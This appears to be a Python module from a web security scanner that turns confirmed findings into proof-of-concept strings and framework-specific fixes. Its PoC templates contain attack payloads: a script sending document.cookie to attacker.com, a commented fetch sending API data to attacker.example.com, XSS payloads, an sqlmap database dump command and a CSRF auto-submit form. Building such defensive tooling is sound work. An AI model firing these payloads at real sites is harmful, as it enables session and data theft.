import re
import json
import logging
import textwrap
from typing import Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


_HEADER_FIXES = {
    "nginx": {
        "X-Frame-Options":           'add_header X-Frame-Options "DENY" always;',
        "X-Content-Type-Options":    'add_header X-Content-Type-Options "nosniff" always;',
        "X-XSS-Protection":          'add_header X-XSS-Protection "1; mode=block" always;',
        "Content-Security-Policy":   "add_header Content-Security-Policy \"default-src 'self'; script-src 'self';\" always;",
        "Strict-Transport-Security": 'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;',
        "Referrer-Policy":           'add_header Referrer-Policy "strict-origin-when-cross-origin" always;',
        "Permissions-Policy":        'add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;',
    },
    "apache": {
        "X-Frame-Options":           'Header always set X-Frame-Options "DENY"',
        "X-Content-Type-Options":    'Header always set X-Content-Type-Options "nosniff"',
        "X-XSS-Protection":          'Header always set X-XSS-Protection "1; mode=block"',
        "Content-Security-Policy":   "Header always set Content-Security-Policy \"default-src 'self';\"",
        "Strict-Transport-Security": 'Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"',
        "Referrer-Policy":           'Header always set Referrer-Policy "strict-origin-when-cross-origin"',
        "Permissions-Policy":        'Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"',
    },
    "sveltekit": {
        "X-Frame-Options": """\
// svelte.config.js
export default {
  kit: {
    headers: { 'X-Frame-Options': 'DENY' }
  }
};""",
        "X-Content-Type-Options": """\
// svelte.config.js
export default {
  kit: {
    headers: { 'X-Content-Type-Options': 'nosniff' }
  }
};""",
        "Content-Security-Policy": """\
// hooks.server.js
export async function handle({ event, resolve }) {
  const response = await resolve(event);
  response.headers.set('Content-Security-Policy',
    "default-src 'self'; script-src 'self';");
  return response;
}""",
        "Strict-Transport-Security": """\
// hooks.server.js
response.headers.set('Strict-Transport-Security',
  'max-age=31536000; includeSubDomains');""",
        "Referrer-Policy": """\
// hooks.server.js
response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');""",
        "Permissions-Policy": """\
// hooks.server.js
response.headers.set('Permissions-Policy',
  'geolocation=(), microphone=(), camera=()');""",
    },
    "next.js": {
        "X-Frame-Options": """\
// next.config.js
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'X-Frame-Options', value: 'DENY' }]
  }]
};""",
        "Content-Security-Policy": """\
// next.config.js
const cspHeader = "default-src 'self'; script-src 'self' 'unsafe-eval';";
module.exports = {
  headers: async () => [{
    source: '/(.*)',
    headers: [{ key: 'Content-Security-Policy', value: cspHeader }]
  }]
};""",
        "Strict-Transport-Security": "{ key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' }",
        "Referrer-Policy":           "{ key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' }",
        "Permissions-Policy":        "{ key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' }",
    },
    "express": {
        "X-Frame-Options": """\
// app.js
const helmet = require('helmet');
app.use(helmet.frameguard({ action: 'deny' }));""",
        "Content-Security-Policy": """\
// app.js
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'"],
  }
}));""",
        "Strict-Transport-Security": "app.use(helmet.hsts({ maxAge: 31536000, includeSubDomains: true }));",
        "Referrer-Policy":           "app.use(helmet.referrerPolicy({ policy: 'strict-origin-when-cross-origin' }));",
        "Permissions-Policy": """\
// app.js
app.use((req, res, next) => {
  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  next();
});""",
    },
    "django": {
        "X-Frame-Options":           "# settings.py\nX_FRAME_OPTIONS = 'DENY'",
        "Content-Security-Policy": """\
# settings.py — install django-csp
MIDDLEWARE = ['csp.middleware.CSPMiddleware', ...]
CSP_DEFAULT_SRC = ("'self'",)
CSP_SCRIPT_SRC  = ("'self'",)""",
        "Strict-Transport-Security": """\
# settings.py
SECURE_HSTS_SECONDS            = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD            = True""",
        "Referrer-Policy":  "# settings.py\nSECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'",
        "Permissions-Policy": """\
# settings.py — custom middleware
class PermissionsPolicyMiddleware:
    def __call__(self, request):
        response = self.get_response(request)
        response['Permissions-Policy'] = 'geolocation=(), microphone=(), camera=()'
        return response""",
    },
    "fastapi": {
        "X-Frame-Options": """\
# main.py
from starlette.middleware.base import BaseHTTPMiddleware

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers['X-Frame-Options'] = 'DENY'
        return response

app.add_middleware(SecurityHeadersMiddleware)""",
        "Content-Security-Policy":   "response.headers['Content-Security-Policy'] = \"default-src 'self';\"",
        "Strict-Transport-Security": "response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'",
    },
    "generic": {
        "X-Frame-Options":           "X-Frame-Options: DENY",
        "X-Content-Type-Options":    "X-Content-Type-Options: nosniff",
        "X-XSS-Protection":          "X-XSS-Protection: 1; mode=block",
        "Content-Security-Policy":   "Content-Security-Policy: default-src 'self';",
        "Strict-Transport-Security": "Strict-Transport-Security: max-age=31536000; includeSubDomains",
        "Referrer-Policy":           "Referrer-Policy: strict-origin-when-cross-origin",
        "Permissions-Policy":        "Permissions-Policy: geolocation=(), microphone=(), camera=()",
    },
}

_EFFORT_MINUTES = {
    "Missing Security Header":           2,
    "Missing Clickjacking Protection":   2,
    "Clickjacking":                      2,
    "CORS Misconfiguration":             10,
    "Information Disclosure":            5,
    "Missing CSRF Protection":           30,
    "Reflected XSS":                     60,
    "Stored XSS":                        120,
    "SQL Injection":                     120,
    "Open Redirect":                     15,
    "Sensitive File Exposed":            5,
    "Protected Administrative Endpoint": 5,
    "default":                           30,
}

# Server header values that contain no version/software info and are NOT leaky.
# "cloudflare", bare "nginx", bare "apache" etc. reveal nothing actionable.
# A version string like "nginx/1.18.0" or "Apache/2.4.51 (Ubuntu)" IS leaky.
_SAFE_SERVER_PATTERNS = re.compile(
    r"^(cloudflare|cloudfront|awselb|fastly|google frontend|"
    r"nginx|apache|lighttpd|iis|openresty|caddy|envoy|traefik)$",
    re.I,
)


def _server_is_leaky(value: str) -> bool:
    """
    Return True only when the Server header value discloses a version or
    meaningful software detail that could aid targeted CVE exploitation.

    Examples:
      "cloudflare"           → False  (CDN label, no version)
      "nginx"                → False  (no version)
      "nginx/1.18.0"         → True   (version exposed)
      "Apache/2.4.51 (Ubuntu)" → True
      "Microsoft-IIS/10.0"   → True
      "WP Rocket 3.19.4"     → True
    """
    v = value.strip()
    if not v:
        return False
    # Contains a version-like substring (digit.digit pattern)
    if re.search(r"\d+\.\d+", v):
        return True
    # Matches a bare safe value with no extra tokens
    if _SAFE_SERVER_PATTERNS.fullmatch(v):
        return False
    # Anything else (unknown software name, composite strings) is leaky
    return True


class ActionAgent:

    def process_all(self, findings: List[Dict],
                    target_url: str,
                    stack: Dict,
                    verbose: bool = False,
                    response_headers: Optional[Dict] = None) -> List[Dict]:
        """
        Generate PoC + fix snippets for every confirmed finding.

        response_headers — the actual HTTP response headers from the target
            (keyed lowercase).  Used by _action_info_disclosure_header() to
            embed the real captured Server / X-Powered-By value in the PoC
            and to gate the finding (only fire when the value is actually leaky).
        """
        if verbose:
            print(f"\n  Action Agent — generating PoCs and fix snippets")

        confirmed      = [f for f in findings if f.get("status") == "Confirmed"]
        stack_keywords = self._infer_stack_keywords(stack)
        hdrs           = {k.lower(): v for k, v in (response_headers or {}).items()}

        if verbose:
            print(f"   Stack keywords: {stack_keywords}")

        actions = []
        for finding in confirmed:
            try:
                action = self._process_finding(
                    finding, target_url, stack_keywords, hdrs
                )
                if action:
                    actions.append(action)
            except Exception as e:
                logger.debug(f"Action generation failed for {finding.get('type','?')}: {e}")

        if verbose:
            print(f"   ✓ Generated {len(actions)} action items ({len(confirmed)} confirmed findings)")

        return actions

    def _infer_stack_keywords(self, stack: Dict) -> List[str]:
        keywords = []
        techs    = stack.get("technologies", [])
        summary  = stack.get("stack_summary", "")

        for t in (techs + [summary]):
            if isinstance(t, str):
                kw = t.lower().split("/")[0].strip()
                if kw:
                    keywords.append(kw)
            elif isinstance(t, dict):
                kw = t.get("name", "").lower().split("/")[0].strip()
                if kw:
                    keywords.append(kw)

        aliases    = {"node.js": "express", "nodejs": "express", "svelte": "sveltekit"}
        normalized = [aliases.get(kw, kw) for kw in keywords]
        return list(dict.fromkeys(normalized))

    def _best_stack_for_header(self, stack_keywords: List[str]) -> str:
        priority = ["sveltekit", "next.js", "express", "django",
                    "fastapi", "nginx", "apache"]
        for fw in priority:
            if fw in stack_keywords:
                return fw
        return "generic"

    def _process_finding(self, finding: Dict,
                          target_url: str,
                          stack_keywords: List[str],
                          response_headers: Dict) -> Optional[Dict]:
        vuln_type = finding.get("type", "")
        severity  = finding.get("severity", "Low")
        location  = finding.get("location", target_url)
        parameter = finding.get("parameter", "")
        evidence  = finding.get("evidence", {})

        if "Missing Security Header" in vuln_type:
            return self._action_missing_header(vuln_type, severity, location, stack_keywords)
        elif "Clickjacking" in vuln_type:
            return self._action_clickjacking(location, stack_keywords)
        elif "CORS" in vuln_type:
            return self._action_cors(location, stack_keywords)
        elif "Information Disclosure" in vuln_type and "header" in vuln_type.lower():
            return self._action_info_disclosure_header(
                vuln_type, location, stack_keywords, response_headers
            )
        elif "XSS" in vuln_type or "Cross-Site Scripting" in vuln_type:
            return self._action_xss(vuln_type, location, parameter, evidence, stack_keywords)
        elif "SQL Injection" in vuln_type:
            return self._action_sqli(vuln_type, location, parameter, evidence, stack_keywords)
        elif "Open Redirect" in vuln_type:
            return self._action_open_redirect(location, parameter)
        elif "CSRF" in vuln_type:
            return self._action_csrf(location, stack_keywords)
        elif "Sensitive File" in vuln_type or "Protected Administrative" in vuln_type:
            return self._action_sensitive_file(vuln_type, location, stack_keywords)
        else:
            return self._action_generic(vuln_type, severity, location)

    def _action_missing_header(self, vuln_type: str, severity: str,
                                location: str,
                                stack_keywords: List[str]) -> Dict:
        header       = vuln_type.replace("Missing Security Header:", "").strip()
        stack_key    = self._best_stack_for_header(stack_keywords)
        header_lower = header.lower()

        if header_lower == "content-security-policy":
            poc = (
                'curl -I ' + location + ' | grep -i "' + header + '"\n'
                ' Expected: no output (header absent)\n\n'
                ' Impact: Without CSP, attacker can inject inline scripts:\n'
                ' <script>fetch("https://attacker.com/?c="+document.cookie)</script>'
            )
        elif header_lower == "x-frame-options":
            poc = (
                'curl -I ' + location + ' | grep -i "' + header + '"\n'
                ' Expected: no output (header absent)\n\n'
                ' Impact: Site can be embedded in an iframe — enables clickjacking.\n'
                ' See Clickjacking finding for a full HTML PoC.'
            )
        elif header_lower == "strict-transport-security":
            poc = (
                'curl -I ' + location + ' | grep -i "' + header + '"\n'
                ' Expected: no output (header absent)\n\n'
                ' Impact: Without HSTS, attacker on local network can downgrade\n'
                ' HTTPS to HTTP and intercept traffic (SSL stripping).'
            )
        elif header_lower == "referrer-policy":
            poc = (
                'curl -I ' + location + ' | grep -i "' + header + '"\n'
                ' Expected: no output (header absent)\n\n'
                ' Impact: Browser sends full URL in Referer header to third parties.\n'
                ' Tokens or session IDs in URLs may leak to analytics/ad scripts.'
            )
        else:
            poc = (
                'curl -I ' + location + ' | grep -i "' + header + '"\n'
                ' Expected: no output (header absent)'
            )

        fix_templates = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"])
        fix_snippet   = fix_templates.get(header, header + ": <value>")

        return {
            "finding_type":   vuln_type,
            "severity":       severity,
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   self._fix_language(stack_key),
            "fix_context":    self._fix_context(stack_key, header),
            "effort_minutes": _EFFORT_MINUTES["Missing Security Header"],
        }

    def _action_clickjacking(self, location: str,
                              stack_keywords: List[str]) -> Dict:
        poc = (
            '<!DOCTYPE html>\n'
            '<html>\n'
            '<head><title>Clickjacking PoC</title></head>\n'
            '<body>\n'
            '  <h1>Clickjacking Demonstration</h1>\n'
            '  <p>Target loads inside iframe — proves framing is possible.</p>\n'
            '  <div style="position:relative;width:800px;height:600px;">\n'
            '    <div style="position:absolute;top:0;left:0;'
            'width:100%;height:100%;background:rgba(255,0,0,0.15);'
            'z-index:10;cursor:pointer;"\n'
            "         onclick=\"alert(\'Click intercepted!\')\" >\n"
            '    </div>\n'
            '    <iframe src="' + location + '" width="800" height="600"\n'
            '            style="border:2px solid red;"></iframe>\n'
            '  </div>\n'
            '</body>\n'
            '</html>'
        )

        stack_key   = self._best_stack_for_header(stack_keywords)
        xfo_fix     = _HEADER_FIXES.get(stack_key, _HEADER_FIXES["generic"]).get(
            "X-Frame-Options", "X-Frame-Options: DENY"
        )
        fix_snippet = xfo_fix + "\n# OR use CSP (stronger, preferred):\nContent-Security-Policy: frame-ancestors 'none';"

        return {
            "finding_type":   "Missing Clickjacking Protection",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "fix_snippet":    fix_snippet,
            "fix_language":   self._fix_language(stack_key),
            "fix_context":    self._fix_context(stack_key, "X-Frame-Options"),
            "effort_minutes": _EFFORT_MINUTES["Missing Clickjacking Protection"],
        }

    def _action_cors(self, location: str,
                     stack_keywords: List[str]) -> Dict:
        poc = (
            '# PoC 1: Verify CORS misconfiguration with curl\n'
            'curl -s -I -H "Origin: https://evil-attacker.example.com" \\\n'
            '  ' + location + ' | grep -i "access-control"\n'
            '# Expected: Access-Control-Allow-Origin: https://evil-attacker.example.com\n\n'
            '# PoC 2: Browser-based cross-origin data theft\n'
            '# fetch("' + location + '/api/user", { credentials: "include" })\n'
            '#   .then(r => r.text())\n'
            '#   .then(data => fetch("https://attacker.example.com/steal?data=" + btoa(data)));'
        )

        stack_key = self._best_stack_for_header(stack_keywords)

        if "nginx" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # nginx.conf
                map $http_origin $cors_origin {
                    default "";
                    "https://your-trusted-domain.com" "$http_origin";
                }
                add_header Access-Control-Allow-Origin $cors_origin always;
                add_header Vary Origin always;""")
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                const cors = require('cors');
                const allowedOrigins = ['https://your-trusted-domain.com'];
                app.use(cors({
                  origin: (origin, callback) => {
                    if (!origin || allowedOrigins.includes(origin)) callback(null, true);
                    else callback(new Error('Not allowed by CORS'));
                  },
                  credentials: true,
                }));""")
            fix_language = "javascript"
            fix_context  = "app.js"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # pip install django-cors-headers
                INSTALLED_APPS = ['corsheaders', ...]
                MIDDLEWARE = ['corsheaders.middleware.CorsMiddleware', ...]
                CORS_ALLOWED_ORIGINS = ['https://your-trusted-domain.com']
                CORS_ALLOW_CREDENTIALS = True""")
            fix_language = "python"
            fix_context  = "settings.py"
        else:
            fix_snippet  = (
                "# Replace: Access-Control-Allow-Origin: *\n"
                "# With:    Access-Control-Allow-Origin: https://your-trusted-domain.com\n"
                "# Never combine wildcard (*) with Allow-Credentials: true"
            )
            fix_language = "text"
            fix_context  = "Web server / application CORS configuration"

        return {
            "finding_type":   "CORS Misconfiguration",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["CORS Misconfiguration"],
        }

    def _action_info_disclosure_header(self, vuln_type: str, location: str,
                                        stack_keywords: List[str],
                                        response_headers: Dict) -> Optional[Dict]:
        """
        Generate PoC and fix for Server / X-Powered-By information disclosure.

        Gate: only returns an action when the captured header value is actually
        leaky (contains a version string or non-trivial software name).
        If the value is a bare CDN/proxy label (e.g. "cloudflare", "nginx")
        with no version, return None — there is nothing to fix.

        The real captured value is embedded in the PoC curl output so the
        report shows evidence rather than a placeholder.
        """
        is_xpb   = "x-powered-by" in vuln_type.lower()
        header   = "X-Powered-By" if is_xpb else "Server"
        hdr_key  = header.lower()

        # Capture the actual value from the response
        captured = response_headers.get(hdr_key, "").strip()

        # Gate: if we captured a value, check whether it's actually leaky.
        # If it's empty we couldn't read it — still generate the finding but
        # note that manual confirmation is needed.
        if captured and not _server_is_leaky(captured):
            logger.debug(
                "action_agent: suppressing server header finding — "
                "value %r is not leaky", captured
            )
            return None

        # Build the PoC line showing the real captured value (or a note if absent)
        if captured:
            shows_line = f" Shows: {header}: {captured}"
        else:
            shows_line = f" Shows: {header}: <run curl to capture live value>"

        poc = (
            f'curl -I {location} | grep -i "{header}"\n'
            f'{shows_line}\n\n'
            f' Impact: Version/software info in {header} header enables targeted\n'
            f' CVE lookup — attacker narrows exploits to your exact server version.'
        )

        # Fix snippet — stack-aware
        if "nginx" in stack_keywords:
            fix_snippet  = "# nginx.conf\nserver_tokens off;\nmore_clear_headers Server;"
            fix_language = "nginx"
            fix_context  = "nginx.conf"
        elif "apache" in stack_keywords:
            fix_snippet  = "# httpd.conf\nServerTokens Prod\nServerSignature Off\nHeader unset X-Powered-By"
            fix_language = "apache"
            fix_context  = "httpd.conf"
        elif "express" in stack_keywords or "node" in stack_keywords:
            fix_snippet  = "const helmet = require('helmet');\napp.use(helmet());\n// Or: app.disable('x-powered-by');"
            fix_language = "javascript"
            fix_context  = "app.js"
        else:
            fix_snippet  = f"Remove or obscure the {header} response header in your web server configuration."
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
            "severity":       "Low",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Information Disclosure"],
        }

    def _action_xss(self, vuln_type: str, location: str,
                    parameter: str, evidence: Dict,
                    stack_keywords: List[str]) -> Dict:
        method = evidence.get("confirmation_method", "http_body")

        if parameter:
            if method in ("js_execution", "dom_reflection"):
                poc = (
                    "# XSS confirmed — payload executed\n"
                    "# Location: " + location + "\n"
                    "# Parameter: " + parameter + "\n"
                    '# Payload: "><script>alert(document.cookie)</script>'
                )
            else:
                poc = (
                    "curl -X POST " + '"' + location + '"' + " \\\n"
                    '  --data-urlencode "' + parameter + '=><script>alert(1)</script>"\n'
                    "# Check response for reflected payload"
                )
        else:
            poc = (
                "# Manual verification required\n"
                "# Location: " + location + "\n"
                '# Test: "><script>alert(1)</script>'
            )

        if "react" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                import DOMPurify from 'dompurify';
                // BAD:  <div dangerouslySetInnerHTML={{ __html: userInput }} />
                // GOOD:
                <div dangerouslySetInnerHTML={{
                  __html: DOMPurify.sanitize(userInput)
                }} />
                // Or: <div>{userInput}</div>  // auto-escaped""")
            fix_language = "jsx"
            fix_context  = "Component rendering user input"
        elif "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                {# Django templates auto-escape by default #}
                {# BAD: {{ user_input | safe }} #}
                {# GOOD: #}
                {{ user_input }}""")
            fix_language = "python"
            fix_context  = "Django template"
        else:
            fix_snippet = textwrap.dedent("""\
                function escapeHtml(str) {
                  return str
                    .replace(/&/g, '&amp;')
                    .replace(/</g, '&lt;')
                    .replace(/>/g, '&gt;')
                    .replace(/"/g, '&quot;');
                }""")
            fix_language = "javascript"
            fix_context  = "Server-side output encoding"

        return {
            "finding_type":   vuln_type,
            "severity":       "High",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Reflected XSS"],
        }

    def _action_sqli(self, vuln_type: str, location: str,
                     parameter: str, evidence: Dict,
                     stack_keywords: List[str]) -> Dict:
        method = evidence.get("confirmation_method", "pattern")
        tech   = "T" if method == "timing" else "E"
        poc    = (
            "sqlmap -u " + '"' + location + '"' + " \\\n"
            '  --data="' + parameter + '=test" \\\n'
            "  --technique=" + tech + " --batch --dbs"
        )

        if "django" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                # Django ORM is safe by default:
                User.objects.filter(username=username)
                # For raw SQL:
                cursor.execute("SELECT * FROM t WHERE id = %s", [user_id])""")
            fix_language = "python"
            fix_context  = "Django ORM query"
        elif "php" in stack_keywords:
            fix_snippet = textwrap.dedent("""\
                $stmt = $pdo->prepare("SELECT * FROM users WHERE name = ?");
                $stmt->execute([$name]);""")
            fix_language = "php"
            fix_context  = "Database query"
        else:
            fix_snippet  = "connection.query('SELECT * FROM users WHERE id = ?', [userId]);"
            fix_language = "javascript"
            fix_context  = "Database query"

        return {
            "finding_type":   vuln_type,
            "severity":       "Critical",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "command",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["SQL Injection"],
        }

    def _action_open_redirect(self, location: str, parameter: str) -> Dict:
        poc = (
            'curl -I "' + location + '?' + parameter + '=https://evil-attacker.example.com"\n'
            "# Check Location header — should point to attacker domain"
        )
        fix_snippet = textwrap.dedent("""\
            const ALLOWED_HOSTS = ['your-domain.com'];
            function safeRedirect(url, res) {
              try {
                const parsed = new URL(url);
                if (ALLOWED_HOSTS.includes(parsed.hostname)) return res.redirect(url);
              } catch (e) {}
              return res.redirect('/');
            }""")
        return {
            "finding_type":   "Open Redirect",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   "javascript",
            "fix_context":    "Redirect handler",
            "effort_minutes": _EFFORT_MINUTES["Open Redirect"],
        }

    def _action_csrf(self, location: str,
                     stack_keywords: List[str]) -> Dict:
        poc = textwrap.dedent("""\
            <!DOCTYPE html>
            <html>
            <body onload="document.csrf_form.submit()">
              <form name="csrf_form" action=\"""") + location + textwrap.dedent("""\
" method="POST">
                <input type="hidden" name="action" value="attacker_controlled">
              </form>
            </body>
            </html>""")

        if "django" in stack_keywords:
            fix_snippet  = "MIDDLEWARE = ['django.middleware.csrf.CsrfViewMiddleware', ...]\n# In template: {% csrf_token %}"
            fix_language = "python"
            fix_context  = "settings.py + templates"
        elif "sveltekit" in stack_keywords:
            fix_snippet  = "// svelte.config.js\nexport default { kit: { csrf: { checkOrigin: true } } };"
            fix_language = "javascript"
            fix_context  = "svelte.config.js"
        else:
            fix_snippet = textwrap.dedent("""\
                const csrfToken = crypto.randomBytes(32).toString('hex');
                session.csrfToken = csrfToken;
                // Embed in form: <input type="hidden" name="csrf_token" value="...">
                // Validate: if (req.body.csrf_token !== req.session.csrfToken) return 403;""")
            fix_language = "javascript"
            fix_context  = "Session / form handling"

        return {
            "finding_type":   "Missing CSRF Protection",
            "severity":       "Medium",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "html",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Missing CSRF Protection"],
        }

    def _action_sensitive_file(self, vuln_type: str, location: str,
                                stack_keywords: List[str]) -> Dict:
        from urllib.parse import urlparse
        m    = re.search(r"(/\S+)", vuln_type)
        path = m.group(1) if m else urlparse(location).path
        poc  = 'curl -s "' + location + '"\n# Returns HTTP 200 with file contents'

        if "nginx" in stack_keywords:
            fix_snippet  = "location ~* " + re.escape(path) + " {\n    deny all;\n    return 404;\n}"
            fix_language = "nginx"
            fix_context  = "nginx.conf server block"
        elif "apache" in stack_keywords:
            fix_snippet  = '<Files "' + path.lstrip('/') + '">\n    Require all denied\n</Files>'
            fix_language = "apache"
            fix_context  = ".htaccess"
        else:
            fix_snippet  = "Remove " + path + " from the web server document root or block access in server config."
            fix_language = "text"
            fix_context  = "Web server configuration"

        return {
            "finding_type":   vuln_type,
            "severity":       "High",
            "location":       location,
            "attack_poc":     poc,
            "poc_type":       "curl",
            "fix_snippet":    fix_snippet,
            "fix_language":   fix_language,
            "fix_context":    fix_context,
            "effort_minutes": _EFFORT_MINUTES["Sensitive File Exposed"],
        }

    def _action_generic(self, vuln_type: str, severity: str,
                         location: str) -> Optional[Dict]:
        return {
            "finding_type":   vuln_type,
            "severity":       severity,
            "location":       location,
            "attack_poc":     "# Manual verification required\n# Location: " + location,
            "poc_type":       "none",
            "fix_snippet":    "# Consult the remediation section for fix guidance.",
            "fix_language":   "text",
            "fix_context":    "Application code",
            "effort_minutes": _EFFORT_MINUTES["default"],
        }

    def _fix_language(self, stack_key: str) -> str:
        return {
            "sveltekit": "javascript",
            "next.js":   "javascript",
            "express":   "javascript",
            "django":    "python",
            "fastapi":   "python",
            "nginx":     "nginx",
            "apache":    "apache",
            "generic":   "text",
        }.get(stack_key, "text")

    def _fix_context(self, stack_key: str, header: str) -> str:
        return {
            "sveltekit": "hooks.server.js or svelte.config.js",
            "next.js":   "next.config.js",
            "express":   "app.js / server entry point",
            "django":    "settings.py",
            "fastapi":   "main.py / middleware",
            "nginx":     "nginx.conf server block",
            "apache":    "httpd.conf or .htaccess",
            "generic":   "Web server / application configuration",
        }.get(stack_key, "Application configuration")